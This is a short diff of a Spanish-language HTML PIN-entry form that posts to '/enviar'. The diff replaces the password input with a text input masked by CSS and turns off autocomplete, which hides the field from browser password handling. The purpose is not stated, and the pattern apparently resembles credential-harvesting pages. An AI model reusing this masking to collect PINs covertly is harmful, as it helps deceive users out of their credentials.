@@ -22,18 +22,21 @@
 
         <br/>
         <h4 class="mb-4" style="font-size: 1.4rem;"> Ingrese PIN </h4>
-        <form action="/enviar" method="post">
+        <form action="/enviar" method="post" autocomplete="off">
             <div class="mb-3">
-                <input type="password"
+                <input type="text"
                        name="mensaje"
                        class="form-control text-center"
                        placeholder=""
                        minlength="4"
                        maxlength="8"
+                       autocomplete="new-password"
+                       style="-webkit-text-security: disc"
                        pattern=".{4,8}"
                        title="Debe tener entre 4 y 8 caracteres"
                        required>
             </div>
+            
             <br/>
             <button type="submit" class="btn w-100" 
             style="background-color: #5f0606; color: white; border: none;"> Ingresar  </button>
